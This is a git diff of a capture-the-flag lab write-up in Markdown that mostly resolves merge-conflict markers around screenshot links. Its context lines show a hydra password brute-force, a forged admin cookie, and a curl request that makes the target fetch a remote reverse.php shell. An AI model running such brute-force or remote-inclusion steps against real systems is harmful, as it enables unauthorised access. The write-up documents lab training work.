@@ -188,16 +188,9 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-
 
 **Result:** Hydra returned a valid username/password pair for `sarah.johnson`. Logging in with those credentials at `/index.php` returned a valid `nexus_session` cookie — my first authenticated foothold on the app, as a normal (non-admin) user.
 
-<<<<<<< HEAD
 **What this tells me / what's next:** I now had a real, logged-in session as a low-privileged employee account, which is exactly what's needed to legitimately request a JWT from the API (rather than trying to bypass authentication entirely). From here, the API itself becomes the next target.
 
 ![Screenshot:](<../../.gitbook/assets/hydra (1).jpg>)
-=======
-![Screenshot:](screenshots/hydra.jpg)
-
-**What this tells me / what's next:** I now had a real, logged-in session as a low-privileged employee account, which is exactly what's needed to legitimately request a JWT from the API (rather than trying to bypass authentication entirely). From here, the API itself becomes the next target.
-
->>>>>>> 0c5a6dd (ssfinal now added)
 
 ***
 
@@ -292,17 +285,9 @@ print(forged_cookie)
 
 **Flag 2:** `THM{flag2}`
 
-<<<<<<< HEAD
-![Screenshot:](../../.gitbook/assets/forgecookie.jpg) ![Screenshot:](../../.gitbook/assets/adminprog.jpg) ![Screenshot:](../../.gitbook/assets/adminco.png)
-
-\======= `![Screenshot: forged cookie set in browser dev tools]` `![Screenshot: admin panel access showing flag 2]` ![Screenshot:](../../.gitbook/assets/forgecookie.jpg) ![Screenshot:](../../.gitbook/assets/adminprog.jpg) ![Screenshot:](../../.gitbook/assets/adminco.png)
-=======
-
-![Screenshot:](../../.gitbook/assets/forgecookie.jpg)
+![Screenshot:](../../.gitbook/assets/forgecookie.jpg) 
 ![Screenshot:](../../.gitbook/assets/adminprog.jpg) 
 ![Screenshot:](../../.gitbook/assets/adminco.png)
->>>>>>> 0c5a6dd (ssfinal now added)
-
 ***
 
 ### 9. Flag 3 — Turning File-Read into Code Execution
@@ -346,7 +331,6 @@ curl 'http://<ip>/api/files.php?name=http://:8000/reverse.php' \
 
 **Flag 3:** `THM{flag3}` _(found on disk after gaining a shell as www-data)_
 
-### `![Screenshot: reverse shell landing as www-data]` `![Screenshot: locating and reading flag 3 on disk]`
 
 ![Screenshot:](../../.gitbook/assets/gotshell.jpg)
 
